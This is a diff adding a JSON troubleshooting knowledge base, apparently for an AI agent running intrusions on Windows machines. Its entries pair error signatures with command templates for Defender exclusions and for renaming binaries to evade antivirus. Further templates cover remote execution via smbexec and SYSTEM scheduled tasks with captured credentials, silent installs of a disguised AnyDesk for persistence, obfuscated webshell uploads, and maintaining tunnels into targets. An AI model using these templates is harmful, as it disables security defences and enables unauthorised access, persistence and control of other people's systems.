@@ -1,0 +1,1035 @@
+{
+  "entries": [
+    {
+      "id": "defender-tamper-blocks-disable",
+      "signature": {
+        "stderr_patterns": [
+          "set-mppreference.*not.recognized",
+          "tamper.protection",
+          "disablerealtime.*no.effect"
+        ],
+        "stdout_patterns": [
+          "set-mppreference.*disable"
+        ],
+        "exit_codes": [
+          0,
+          1
+        ],
+        "context_required": {
+          "os_hint": "windows",
+          "verb_class": "disable"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Windows Tamper Protection (ON by default Win10/11) silently blocks Set-MpPreference -DisableRealtimeMonitoring. Command may exit 0 but has NO effect.",
+        "confidence": 0.9,
+        "disambiguators": [
+          "If Set-MpPreference returns error 'not recognized' = PowerShell not available (different issue)",
+          "If on Windows Server with GPO = Tamper Protection may be off"
+        ],
+        "alternative_causes": [
+          "PowerShell execution policy blocking",
+          "Non-admin session"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Use ExclusionPath instead (works WITH Tamper Protection)",
+          "command_template": "powershell -c \"Set-MpPreference -ExclusionPath 'C:\\Temp','C:\\Target' -ExclusionProcess 'target.exe'\"",
+          "preconditions": [
+            "Admin/SYSTEM context"
+          ],
+          "when": "Target is Win10/11 with Tamper Protection enabled"
+        },
+        {
+          "action": "Rename binary to bypass signature-based detection",
+          "command_template": "ren C:\\Temp\\detected.exe C:\\Temp\\svchelper.exe",
+          "preconditions": [
+            "Write access to file location"
+          ],
+          "when": "Defender detects specific binary by signature/name"
+        }
+      ],
+      "verification": {
+        "command": "powershell -c \"(Get-MpPreference).ExclusionPath\"",
+        "success_pattern": "C:\\\\Temp",
+        "failure_pattern": "^$"
+      },
+      "anti_patterns": [
+        {
+          "action": "Set-MpPreference -DisableRealtimeMonitoring",
+          "why": "Silently fails when Tamper Protection is ON (Win10/11 default)"
+        },
+        {
+          "action": "Stopping Windows Defender service directly",
+          "why": "Protected by Tamper Protection; requires disabling TP first which needs GUI"
+        }
+      ],
+      "decay_seconds": 900
+    },
+    {
+      "id": "smbexec-output-lost",
+      "signature": {
+        "stderr_patterns": [
+          "completed with no output",
+          "output.*empty"
+        ],
+        "stdout_patterns": [
+          "pwn3d.*executed",
+          "executed.*command"
+        ],
+        "exit_codes": [
+          0,
+          1
+        ],
+        "context_required": {
+          "tool_class": "netexec|smbexec|crackmapexec"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "smbexec creates temp service, executes command, cleans up. Output written to C$ temp file may be deleted by AV before retrieval, or command produces no stdout.",
+        "confidence": 0.85,
+        "disambiguators": [
+          "If 'Pwn3d' shown = auth works, execution happened",
+          "If no Pwn3d = auth or SMB issue entirely"
+        ],
+        "alternative_causes": [
+          "Command produced stderr only (not captured)",
+          "Command hung/timed out server-side",
+          "AV deleted output file before retrieval"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Redirect output to persistent file, read separately via C$ share",
+          "command_template": "netexec smb TARGET -u USER -p PASS -x 'cmd /c COMMAND > C:\\Temp\\out.txt 2>&1' --exec-method smbexec",
+          "preconditions": [
+            "Write access to C:\\Temp on target"
+          ],
+          "when": "Need to see command output"
+        },
+        {
+          "action": "Read output file from DC via net use + type",
+          "command_template": "net use X: \\\\TARGET\\c$ /user:DOMAIN\\USER PASS && type X:\\Temp\\out.txt && net use X: /delete /y",
+          "preconditions": [
+            "Network path between DC and target",
+            "Admin share accessible"
+          ],
+          "when": "After redirecting output to file"
+        }
+      ],
+      "verification": {
+        "command": "net use X: \\\\TARGET\\c$ && dir X:\\Temp\\out.txt && type X:\\Temp\\out.txt && net use X: /delete /y",
+        "success_pattern": "out\\.txt",
+        "failure_pattern": "File Not Found"
+      },
+      "anti_patterns": [
+        {
+          "action": "Relying on netexec stdout for smbexec results",
+          "why": "Output retrieval is unreliable when AV is active; temp file gets quarantined"
+        },
+        {
+          "action": "Adding --get-output-tries without AV exclusion",
+          "why": "More retries won't help if AV deletes the file instantly"
+        }
+      ],
+      "decay_seconds": 600
+    },
+    {
+      "id": "ssh-tunnel-timeout",
+      "signature": {
+        "stderr_patterns": [
+          "connection timed.out",
+          "exit.code.143"
+        ],
+        "stdout_patterns": [],
+        "exit_codes": [
+          143,
+          255,
+          124
+        ],
+        "context_required": {
+          "tool_class": "ssh"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "SSH via CF tunnel timing out. Tunnel may be unhealthy, target sshd stopped, or command execution exceeds timeout.",
+        "confidence": 0.8,
+        "disambiguators": [
+          "Exit 143 = killed by timeout (SIGTERM)",
+          "Exit 255 = SSH protocol error (key/auth/port)",
+          "If simple commands also timeout = tunnel down"
+        ],
+        "alternative_causes": [
+          "CF tunnel process crashed on target",
+          "Target machine rebooted/offline",
+          "Sleep in command exceeds tool timeout"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Verify tunnel health first (quick HTTP probe)",
+          "command_template": "curl -s --max-time 5 https://TUNNEL_URL/ -o /dev/null -w '%{http_code}'",
+          "preconditions": [
+            "Know the tunnel URL"
+          ],
+          "when": "Before running heavy SSH commands"
+        },
+        {
+          "action": "Run minimal command to verify SSH access works",
+          "command_template": "ssh -o ConnectTimeout=10 ... 'hostname'",
+          "preconditions": [
+            "Tunnel confirmed up"
+          ],
+          "when": "After confirming tunnel is healthy"
+        },
+        {
+          "action": "Remove sleep from command (sleep eats into tool timeout budget)",
+          "command_template": "Remove 'sleep X &&' prefix; run SSH directly",
+          "preconditions": [],
+          "when": "Command has sleep prefix that wastes timeout budget"
+        }
+      ],
+      "verification": {
+        "command": "ssh -o ConnectTimeout=10 ... 'echo ALIVE'",
+        "success_pattern": "ALIVE",
+        "failure_pattern": "timed.out|refused|denied"
+      },
+      "anti_patterns": [
+        {
+          "action": "Adding sleep before SSH command",
+          "why": "Sleep eats into the 120s tool timeout; SSH + sleep > 120s = killed (exit 143)"
+        },
+        {
+          "action": "Retrying same command with longer sleep",
+          "why": "Makes timeout MORE likely, not less"
+        },
+        {
+          "action": "Increasing ConnectTimeout beyond 20s",
+          "why": "If tunnel is down, waiting longer won't fix it"
+        }
+      ],
+      "decay_seconds": 300
+    },
+    {
+      "id": "anydesk-pua-detection",
+      "signature": {
+        "stderr_patterns": [
+          "anydesk.*quarantin",
+          "anydesk.*block",
+          "pua.*anydesk"
+        ],
+        "stdout_patterns": [
+          "anydesk.*install.*silent"
+        ],
+        "exit_codes": [
+          0,
+          1
+        ],
+        "context_required": {
+          "tool_class": "anydesk|remote.support"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Microsoft Defender classifies AnyDesk as PUA (Potentially Unwanted App) since Feb 2024. Installer is blocked/quarantined on execution.",
+        "confidence": 0.85,
+        "disambiguators": [
+          "If file disappears from disk = quarantined by AV",
+          "If file exists but install folder not created = execution blocked"
+        ],
+        "alternative_causes": [
+          "Installer needs interactive desktop session",
+          "UAC blocking non-elevated install"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Add Defender exclusion BEFORE running installer",
+          "command_template": "powershell -c \"Set-MpPreference -ExclusionPath 'C:\\Temp' -ExclusionProcess 'AnyDesk.exe'\"",
+          "preconditions": [
+            "Admin context",
+            "ExclusionPath not blocked by policy"
+          ],
+          "when": "First step before any install attempt"
+        },
+        {
+          "action": "Rename AnyDesk binary to avoid PUA signature match",
+          "command_template": "ren C:\\Temp\\AnyDesk.exe C:\\Temp\\RemoteSupport.exe && C:\\Temp\\RemoteSupport.exe --install C:\\RemSupport --start-with-win --silent",
+          "preconditions": [
+            "File exists at C:\\Temp"
+          ],
+          "when": "If exclusion alone doesn't work"
+        },
+        {
+          "action": "Install to path without spaces (avoid quoting issues in remote exec)",
+          "command_template": "C:\\Temp\\AnyDesk.exe --install C:\\AnyDesk --start-with-win --silent",
+          "preconditions": [
+            "Defender exclusion already applied"
+          ],
+          "when": "Using remote execution methods that strip quotes"
+        }
+      ],
+      "verification": {
+        "command": "dir C:\\AnyDesk\\AnyDesk.exe && tasklist /fi \"imagename eq AnyDesk*\"",
+        "success_pattern": "AnyDesk\\.exe.*bytes|AnyDesk.*Running",
+        "failure_pattern": "File Not Found|No tasks"
+      },
+      "anti_patterns": [
+        {
+          "action": "Running AnyDesk installer without Defender exclusion on Win10/11",
+          "why": "Defender blocks AnyDesk as PUA since Feb 2024; install silently fails"
+        },
+        {
+          "action": "Trying to disable Defender instead of adding exclusion",
+          "why": "Tamper Protection prevents Defender disable; exclusion is the correct approach"
+        },
+        {
+          "action": "Re-running same install command hoping it works",
+          "why": "Same binary + same path + same Defender = same block every time"
+        }
+      ],
+      "decay_seconds": 900
+    },
+    {
+      "id": "wmic-rpc-unavailable",
+      "signature": {
+        "stderr_patterns": [
+          "rpc.server.*unavailable",
+          "rpc.*not.available",
+          "endpoint.mapper"
+        ],
+        "stdout_patterns": [
+          "wmic.*node"
+        ],
+        "exit_codes": [
+          1,
+          null
+        ],
+        "context_required": {
+          "tool_class": "wmic|wmi",
+          "verb_class": "exec"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "WMI/RPC service blocked between source and target. Windows Firewall on target blocks RPC (135/TCP + dynamic ports) or WMI service not running.",
+        "confidence": 0.85,
+        "disambiguators": [
+          "If other RPC services also fail (e.g., schtasks) = firewall blocking RPC entirely",
+          "If only WMI fails but SMB works = WMI service specifically disabled"
+        ],
+        "alternative_causes": [
+          "Network segmentation between hosts",
+          "WMI service crashed/disabled on target"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Use SMB-based execution instead (smbexec/psexec \u2014 only needs port 445)",
+          "command_template": "netexec smb TARGET -u USER -p PASS -x 'COMMAND' --exec-method smbexec",
+          "preconditions": [
+            "SMB (445) accessible to target",
+            "Admin credentials"
+          ],
+          "when": "WMI/RPC blocked but SMB accessible"
+        },
+        {
+          "action": "Use schtasks (only needs SMB for task creation)",
+          "command_template": "schtasks /create /s TARGET /u USER /p PASS /tn TASKNAME /tr COMMAND /sc once /st 00:00 /ru SYSTEM && schtasks /run /s TARGET /u USER /p PASS /tn TASKNAME",
+          "preconditions": [
+            "Task Scheduler service running on target"
+          ],
+          "when": "Need reliable remote exec without RPC"
+        }
+      ],
+      "verification": {
+        "command": "netexec smb TARGET -u USER -p PASS -x 'hostname' --exec-method smbexec",
+        "success_pattern": "Pwn3d|Executed",
+        "failure_pattern": "STATUS_ACCESS_DENIED|Connection refused"
+      },
+      "anti_patterns": [
+        {
+          "action": "Retrying wmic with different credentials",
+          "why": "If RPC is blocked by firewall, credentials are irrelevant"
+        },
+        {
+          "action": "Trying wmic from a different source host in same network",
+          "why": "Firewall rules apply by port, not by source (usually)"
+        }
+      ],
+      "decay_seconds": 600
+    },
+    {
+      "id": "quoting-nested-ssh-cmd",
+      "signature": {
+        "stderr_patterns": [
+          "unexpected.token",
+          "syntax.error",
+          "dquote>",
+          "event.not.found",
+          "bad.substitution"
+        ],
+        "stdout_patterns": [],
+        "exit_codes": [
+          1,
+          2,
+          127
+        ],
+        "context_required": {
+          "tool_class": "ssh"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Nested quoting failure in SSH command chain. Outer shell (zsh/bash on Kali) interprets quotes/special chars before SSH sends them to remote shell.",
+        "confidence": 0.8,
+        "disambiguators": [
+          "'dquote>' = unclosed double quote in zsh",
+          "'event not found' = ! char interpreted by bash history expansion",
+          "'bad substitution' = $ interpreted locally"
+        ],
+        "alternative_causes": [
+          "Remote shell is cmd.exe but command uses bash syntax",
+          "PowerShell special chars ($, @) not escaped"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Use single quotes for outer SSH wrapper, double quotes inside for remote cmd",
+          "command_template": "ssh ... 'remote_command_with \"inner quotes\"'",
+          "preconditions": [],
+          "when": "Remote command needs quotes but outer SSH also needs quoting"
+        },
+        {
+          "action": "Escape special characters or write command to file first",
+          "command_template": "echo 'COMMAND' > /tmp/cmd.txt && ssh ... 'cmd /c' < /tmp/cmd.txt",
+          "preconditions": [],
+          "when": "Command too complex for single-line quoting"
+        },
+        {
+          "action": "Use heredoc or base64 encoding for complex payloads",
+          "command_template": "ssh ... \"powershell -enc $(echo 'COMMAND' | iconv -t utf-16le | base64 -w0)\"",
+          "preconditions": [
+            "PowerShell available on target"
+          ],
+          "when": "Command has many special characters that break in any quoting scheme"
+        }
+      ],
+      "verification": {
+        "command": "ssh ... 'echo QUOTING_OK'",
+        "success_pattern": "QUOTING_OK",
+        "failure_pattern": "unexpected|syntax|dquote"
+      },
+      "anti_patterns": [
+        {
+          "action": "Adding more backslash escapes without understanding which shell layer interprets them",
+          "why": "Each SSH hop adds a layer of interpretation; blind escaping makes it worse"
+        },
+        {
+          "action": "Using double quotes for outer SSH command containing $ or !",
+          "why": "zsh/bash expand $ and ! inside double quotes before SSH sees them"
+        }
+      ],
+      "decay_seconds": 300
+    },
+    {
+      "id": "sleep-causes-tool-timeout",
+      "signature": {
+        "stderr_patterns": [],
+        "stdout_patterns": [
+          "sleep \\d+"
+        ],
+        "exit_codes": [
+          143,
+          124
+        ],
+        "context_required": {}
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Command prefixed with 'sleep N' causes total execution time to exceed Claude Code's 120s tool timeout. Process killed with SIGTERM (exit 143).",
+        "confidence": 0.9,
+        "disambiguators": [
+          "If exit 143 and command has sleep > 60s = almost certainly this issue",
+          "If exit 143 without sleep = actual command is slow"
+        ],
+        "alternative_causes": [
+          "Actual command is very slow (large file transfer, heavy scan)"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Remove sleep prefix \u2014 run command directly",
+          "command_template": "Remove 'sleep X &&' from command. If waiting for a prior async operation, verify its completion first.",
+          "preconditions": [],
+          "when": "sleep is used as arbitrary wait before command"
+        },
+        {
+          "action": "Use run_in_background for long-running commands",
+          "command_template": "Use Bash tool with run_in_background: true parameter",
+          "preconditions": [
+            "Output not needed immediately"
+          ],
+          "when": "Command legitimately takes > 60 seconds"
+        }
+      ],
+      "verification": {
+        "command": "Run command without sleep prefix",
+        "success_pattern": "",
+        "failure_pattern": "exit.143|timed.out"
+      },
+      "anti_patterns": [
+        {
+          "action": "Increasing sleep duration when previous sleep+command timed out",
+          "why": "More sleep = MORE likely to hit 120s timeout, not less"
+        },
+        {
+          "action": "Using sleep to wait for async tunnel/service to start",
+          "why": "Use verification command instead of blind sleep (e.g., curl --retry for tunnel)"
+        }
+      ],
+      "decay_seconds": 120
+    },
+    {
+      "id": "credential-lockout",
+      "signature": {
+        "stderr_patterns": [
+          "account.*lock",
+          "STATUS_ACCOUNT_LOCKED",
+          "too.many.attempts",
+          "too.many.failures",
+          "try.again.later",
+          "COM_1055"
+        ],
+        "stdout_patterns": [
+          "logon.failure.*multiple",
+          "too.many.failures",
+          "try.again.later"
+        ],
+        "exit_codes": [
+          1
+        ],
+        "context_required": {
+          "verb_class": "auth"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Account locked due to too many failed auth attempts. Lockout policy triggered.",
+        "confidence": 0.9,
+        "disambiguators": [
+          "If different user works = specific account locked",
+          "If all users fail = not lockout but service/network issue"
+        ],
+        "alternative_causes": [
+          "Password recently changed",
+          "Account disabled by admin"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Wait for lockout timer to expire (typically 30-60 min)",
+          "command_template": "Wait, then retry with correct credentials. Do NOT spray.",
+          "preconditions": [
+            "Know the lockout duration"
+          ],
+          "when": "Account definitely locked"
+        },
+        {
+          "action": "Use a different account with same privileges",
+          "command_template": "Switch to alternative admin account",
+          "preconditions": [
+            "Have alternative credentials"
+          ],
+          "when": "Cannot wait for lockout to expire"
+        }
+      ],
+      "verification": {
+        "command": "netexec smb TARGET -u USER -p PASS",
+        "success_pattern": "Pwn3d|\\+.*USER",
+        "failure_pattern": "STATUS_ACCOUNT_LOCKED|STATUS_LOGON_FAILURE"
+      },
+      "anti_patterns": [
+        {
+          "action": "Retrying same credentials immediately",
+          "why": "Extends lockout timer with each failed attempt"
+        },
+        {
+          "action": "Spraying other passwords on locked account",
+          "why": "Account is LOCKED regardless of password correctness"
+        }
+      ],
+      "decay_seconds": 1800
+    },
+    {
+      "id": "webshell-av-quarantine",
+      "signature": {
+        "stderr_patterns": [
+          "quarantin",
+          "threat.*detect",
+          "malware.*found",
+          "removed.*threat"
+        ],
+        "stdout_patterns": [
+          "upload.*success.*404|upload.*php.*not.found"
+        ],
+        "exit_codes": [
+          0,
+          1
+        ],
+        "context_required": {
+          "verb_class": "transfer"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Uploaded file detected and quarantined by AV/EDR on target. File appears uploaded (exit 0) but is immediately removed.",
+        "confidence": 0.8,
+        "disambiguators": [
+          "If file exists briefly then disappears = real-time AV scan",
+          "If file never appears = blocked at write time"
+        ],
+        "alternative_causes": [
+          "Upload path not writable",
+          "Web server config prevents execution of uploaded files"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Use obfuscation (XOR/bitwise encoding) to bypass signature detection",
+          "command_template": "Generate payload with non-standard encoding (not base64/eval which are signature-matched)",
+          "preconditions": [
+            "Know which AV is running"
+          ],
+          "when": "AV uses signature-based detection"
+        },
+        {
+          "action": "Upload to excluded path (if Defender exclusion was applied)",
+          "command_template": "Upload to path already in ExclusionPath list",
+          "preconditions": [
+            "Defender exclusion applied for target path"
+          ],
+          "when": "Can control which path file lands in"
+        }
+      ],
+      "verification": {
+        "command": "dir TARGET_PATH\\uploaded_file.ext (check file still exists after 5 seconds)",
+        "success_pattern": "\\d+ bytes",
+        "failure_pattern": "File Not Found"
+      },
+      "anti_patterns": [
+        {
+          "action": "Re-uploading same file to same path",
+          "why": "AV will quarantine it again instantly"
+        },
+        {
+          "action": "Using base64+eval obfuscation",
+          "why": "This is the FIRST thing AV signatures match"
+        }
+      ],
+      "decay_seconds": 600
+    },
+    {
+      "id": "cf-tunnel-unhealthy",
+      "signature": {
+        "stderr_patterns": [
+          "tunnel.*not.*found",
+          "tunnel.*inactive",
+          "502",
+          "bad.gateway"
+        ],
+        "stdout_patterns": [
+          "cloudflared.*error",
+          "tunnel.*down"
+        ],
+        "exit_codes": [
+          1,
+          255
+        ],
+        "context_required": {
+          "tool_class": "cloudflared|ssh.*tunnel|curl.*desa\\.id"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Cloudflare tunnel is down or unhealthy. The cloudflared process on target may have crashed, been killed, or the target is offline.",
+        "confidence": 0.85,
+        "disambiguators": [
+          "If tunnel URL returns 502 = tunnel registered but connector offline",
+          "If DNS fails = tunnel deleted or domain misconfigured"
+        ],
+        "alternative_causes": [
+          "Target machine rebooted and cloudflared didn't auto-restart",
+          "CF account token expired",
+          "Network issue on target side"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Check tunnel status via CF API",
+          "command_template": "curl -s -H 'X-Auth-Email: EMAIL' -H 'X-Auth-Key: KEY' 'https://api.cloudflare.com/client/v4/accounts/ACCT/tunnels/TUNNEL_ID' | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d[\"result\"][\"status\"])'",
+          "preconditions": [
+            "CF API credentials available"
+          ],
+          "when": "Need to confirm tunnel state before attempting connection"
+        },
+        {
+          "action": "If target has alternative access (VPN/direct IP), restart cloudflared remotely",
+          "command_template": "Access target via alternative method, then: systemctl restart cloudflared OR start the tunnel service",
+          "preconditions": [
+            "Alternative access method available"
+          ],
+          "when": "Tunnel confirmed down but target still accessible"
+        }
+      ],
+      "verification": {
+        "command": "curl -s --max-time 5 -o /dev/null -w '%{http_code}' https://TUNNEL_URL/",
+        "success_pattern": "200|301|302|401|403",
+        "failure_pattern": "502|503|000"
+      },
+      "anti_patterns": [
+        {
+          "action": "Retrying SSH through dead tunnel",
+          "why": "If tunnel is down, SSH will always timeout regardless of parameters"
+        },
+        {
+          "action": "Increasing timeout hoping tunnel recovers",
+          "why": "Tunnel won't self-heal from a client timeout increase; need to fix server-side"
+        }
+      ],
+      "decay_seconds": 300
+    },
+    {
+      "id": "net-use-drive-conflict",
+      "signature": {
+        "stderr_patterns": [
+          "local.device.*already.in.use",
+          "system.error.85",
+          "network.name.*cannot"
+        ],
+        "stdout_patterns": [
+          "net.use.*\\\\\\\\"
+        ],
+        "exit_codes": [
+          1,
+          2
+        ],
+        "context_required": {
+          "verb_class": "auth"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Drive letter already mapped to different share, or previous session not cleaned up.",
+        "confidence": 0.9,
+        "disambiguators": [
+          "Error 85 = local device name already in use",
+          "Error 53 = network path not found (different issue)"
+        ],
+        "alternative_causes": [
+          "Share path typo",
+          "Target's Server service not running"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Delete existing mapping first, then remap",
+          "command_template": "net use X: /delete /y 2>nul & net use X: \\\\TARGET\\c$ /user:DOMAIN\\USER PASS",
+          "preconditions": [],
+          "when": "Drive letter conflict"
+        },
+        {
+          "action": "Use UNC path directly without drive mapping",
+          "command_template": "type \\\\TARGET\\c$\\path\\file.txt (access directly without net use)",
+          "preconditions": [
+            "Session already authenticated to target"
+          ],
+          "when": "Don't need persistent drive mapping"
+        }
+      ],
+      "verification": {
+        "command": "net use X: (check current mappings)",
+        "success_pattern": "\\\\\\\\TARGET",
+        "failure_pattern": "not found|error"
+      },
+      "anti_patterns": [
+        {
+          "action": "Trying different drive letter without deleting old one",
+          "why": "Accumulates stale mappings; delete first is cleaner"
+        },
+        {
+          "action": "Ignoring the error and proceeding with file operations",
+          "why": "If mapping failed, all subsequent X: operations will fail or target wrong host"
+        }
+      ],
+      "decay_seconds": 120
+    },
+    {
+      "id": "powershell-not-available",
+      "signature": {
+        "stderr_patterns": [
+          "powershell.*not.recognized",
+          "powershell.*not.found",
+          "is.not.recognized.*cmdlet"
+        ],
+        "stdout_patterns": [
+          "powershell"
+        ],
+        "exit_codes": [
+          1,
+          9009
+        ],
+        "context_required": {
+          "os_hint": "windows"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "PowerShell not in PATH or not installed. Common on Server Core, minimal installs, or when running in a restricted cmd.exe context where PS path not set.",
+        "confidence": 0.85,
+        "disambiguators": [
+          "If specific cmdlet 'not recognized' = PS works but module missing",
+          "If 'powershell' itself not found = PS not in PATH"
+        ],
+        "alternative_causes": [
+          "Command running in wrong shell context (cmd vs powershell)",
+          "Constrained Language Mode blocking execution"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Use full path to PowerShell",
+          "command_template": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"COMMAND\"",
+          "preconditions": [
+            "PowerShell actually installed on target"
+          ],
+          "when": "powershell not in PATH but exists on disk"
+        },
+        {
+          "action": "Use cmd.exe native commands instead of PowerShell",
+          "command_template": "Use cmd builtins: reg query, sc, wmic, certutil, bitsadmin instead of PS equivalents",
+          "preconditions": [],
+          "when": "PowerShell genuinely unavailable or constrained"
+        }
+      ],
+      "verification": {
+        "command": "where powershell 2>nul || dir C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "success_pattern": "powershell\\.exe",
+        "failure_pattern": "Could not find|File Not Found"
+      },
+      "anti_patterns": [
+        {
+          "action": "Retrying same PowerShell command",
+          "why": "If PS not available, retrying won't make it appear"
+        },
+        {
+          "action": "Trying PowerShell 7 (pwsh) without knowing it's installed",
+          "why": "pwsh is not default on any Windows; must be explicitly installed"
+        }
+      ],
+      "decay_seconds": 600
+    },
+    {
+      "id": "file-copy-zero-files",
+      "signature": {
+        "stderr_patterns": [
+          "0.file.*copied",
+          "file.not.found",
+          "cannot.copy"
+        ],
+        "stdout_patterns": [
+          "copy|xcopy|robocopy"
+        ],
+        "exit_codes": [
+          0,
+          1,
+          4
+        ],
+        "context_required": {
+          "verb_class": "transfer"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "File copy operation completed but copied 0 files. Source file doesn't exist at expected path, or source path is wrong.",
+        "confidence": 0.85,
+        "disambiguators": [
+          "'0 files copied' with no error = source path wrong but accessible",
+          "'Access denied' = path exists but no read permission"
+        ],
+        "alternative_causes": [
+          "File already exists at destination (overwrite protection)",
+          "Wildcard didn't match any files"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Verify source file exists first",
+          "command_template": "dir SOURCE_PATH (verify file exists and check exact filename)",
+          "preconditions": [],
+          "when": "Before any copy operation"
+        },
+        {
+          "action": "Use xcopy instead of copy for cross-share operations",
+          "command_template": "xcopy SOURCE DEST /Y /Q (xcopy is more reliable for network copies)",
+          "preconditions": [],
+          "when": "copy fails but path is correct"
+        }
+      ],
+      "verification": {
+        "command": "dir DEST_PATH\\filename (verify file arrived)",
+        "success_pattern": "\\d+.*bytes",
+        "failure_pattern": "File Not Found"
+      },
+      "anti_patterns": [
+        {
+          "action": "Using 'copy' for network share operations",
+          "why": "copy is unreliable across shares; use xcopy or robocopy"
+        },
+        {
+          "action": "Retrying copy without verifying source exists",
+          "why": "If source doesn't exist, no amount of retries will copy it"
+        }
+      ],
+      "decay_seconds": 300
+    },
+    {
+      "id": "service-wont-start",
+      "signature": {
+        "stderr_patterns": [
+          "service.*not.*start",
+          "error.*1053",
+          "error.*1067",
+          "error.*1069"
+        ],
+        "stdout_patterns": [
+          "sc.start|net.start|systemctl.start"
+        ],
+        "exit_codes": [
+          1,
+          2
+        ],
+        "context_required": {
+          "verb_class": "config"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Service created/exists but won't start. Common causes: binary path wrong, binary missing, dependencies not met, or service account can't log on.",
+        "confidence": 0.8,
+        "disambiguators": [
+          "Error 1053 = service didn't respond to start in time",
+          "Error 1067 = process terminated unexpectedly (crash)",
+          "Error 1069 = logon failure for service account"
+        ],
+        "alternative_causes": [
+          "Binary is 32-bit but service expects 64-bit (or vice versa)",
+          "Binary requires DLLs not present on target",
+          "AV killed the process on startup"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Verify binary exists at configured path",
+          "command_template": "sc qc SERVICENAME (check BINARY_PATH_NAME) then dir THAT_PATH",
+          "preconditions": [],
+          "when": "Service created but won't start"
+        },
+        {
+          "action": "Check event log for service-specific error",
+          "command_template": "wevtutil qe System /q:\"*[System[Provider[@Name='Service Control Manager']]]\" /c:5 /f:text /rd:true",
+          "preconditions": [
+            "Admin access to target"
+          ],
+          "when": "Service start fails with generic error"
+        }
+      ],
+      "verification": {
+        "command": "sc query SERVICENAME",
+        "success_pattern": "RUNNING",
+        "failure_pattern": "STOPPED|does not exist"
+      },
+      "anti_patterns": [
+        {
+          "action": "Repeatedly running 'net start' without checking why it fails",
+          "why": "Start will always fail if underlying issue (path, deps, account) not fixed"
+        },
+        {
+          "action": "Recreating service without fixing binary",
+          "why": "Same binary = same failure"
+        }
+      ],
+      "decay_seconds": 600
+    },
+    {
+      "id": "port-forward-not-listening",
+      "signature": {
+        "stderr_patterns": [
+          "connection.refused",
+          "port.*not.*open",
+          "bind.*address.*in.use"
+        ],
+        "stdout_patterns": [
+          "ssh.*-[LR]|chisel|socat|tunnel"
+        ],
+        "exit_codes": [
+          1,
+          255
+        ],
+        "context_required": {
+          "verb_class": "persist"
+        }
+      },
+      "min_match_elements": 2,
+      "diagnosis": {
+        "root_cause": "Port forward/tunnel not active. Either tunnel process died, port already in use by another process, or remote service not listening on forwarded port.",
+        "confidence": 0.75,
+        "disambiguators": [
+          "'address in use' = another process using same local port",
+          "'connection refused' at forwarded port = remote service down",
+          "'channel open failed' = SSH tunnel up but remote port not listening"
+        ],
+        "alternative_causes": [
+          "Tunnel process running but not yet connected",
+          "Firewall blocking the local listening port"
+        ]
+      },
+      "remediation": [
+        {
+          "action": "Check if local port is actually listening",
+          "command_template": "ss -tlnp | grep PORT (verify tunnel is bound to local port)",
+          "preconditions": [],
+          "when": "Before connecting through tunnel"
+        },
+        {
+          "action": "Kill existing process on port, then restart tunnel",
+          "command_template": "fuser -k PORT/tcp 2>/dev/null; sleep 1; (restart tunnel command)",
+          "preconditions": [
+            "Know the tunnel startup command"
+          ],
+          "when": "'address in use' error"
+        }
+      ],
+      "verification": {
+        "command": "ss -tlnp | grep PORT && curl -s 127.0.0.1:PORT --max-time 3",
+        "success_pattern": "LISTEN",
+        "failure_pattern": "refused|no.*match"
+      },
+      "anti_patterns": [
+        {
+          "action": "Connecting through tunnel without verifying it's up",
+          "why": "Always verify listener before sending commands through"
+        },
+        {
+          "action": "Starting new tunnel without killing old one",
+          "why": "Will get 'address in use' if old process still holds the port"
+        }
+      ],
+      "decay_seconds": 300
+    }
+  ]
+}
